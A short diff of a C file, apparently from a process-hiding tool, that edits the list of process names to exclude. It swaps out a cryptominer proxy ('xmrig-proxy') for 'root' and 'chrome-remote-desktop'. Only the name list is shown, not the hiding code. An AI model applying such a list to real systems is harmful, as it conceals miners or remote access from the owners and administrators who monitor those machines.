@@ -10,11 +10,10 @@
  * Every process with this name will be excluded
  */
 static const char* processes_to_filter[] = {
-    "xmrig-proxy",
     "proot",
     "supervisord",
-    "deje",
-    "node"
+    "root",
+    "chrome-remote-desktop"
 };
 
 /*
